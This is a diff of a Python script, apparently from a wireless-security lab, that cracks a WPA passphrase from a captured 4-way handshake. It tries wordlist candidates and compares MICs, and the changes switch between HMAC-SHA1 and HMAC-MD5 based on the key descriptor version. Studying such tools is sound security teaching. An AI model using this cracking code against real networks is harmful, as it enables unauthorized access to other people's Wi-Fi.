@@ -36,7 +36,7 @@ handshake2 = wpa[6]
 
 # The last handshake packet contains the MIC encrypted with the KCK
 handshake4 = wpa[8]
-
+handshake1.show()
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
@@ -65,6 +65,9 @@ ssid = str.encode(ssid)
 fileName = "wordlist.txt"
 found = False
 
+# Used to know wether it's HMAC-MD5 or HMAC-SHA1
+keyDescriptorVersion = int.from_bytes(handshake1.load[0:1], byteorder='big')
+
 with open(fileName) as wordlist:
     for passPhrase in wordlist:
         #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
@@ -76,8 +79,11 @@ with open(fileName) as wordlist:
         ptk = customPRF512(pmk,str.encode(A),B)
 
         #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-        mic = hmac.new(ptk[0:16],data,hashlib.sha1)
-
+        if(keyDescriptorVersion == 2):
+            mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+        else:
+            mic = hmac.new(ptk[0:16],data,hashlib.md5)
+        
         if mic.hexdigest()[:-8] == b2a_hex(mic_to_test).decode():
             print("[+] Found passphrase: " + passPhrase.decode())
             found = True
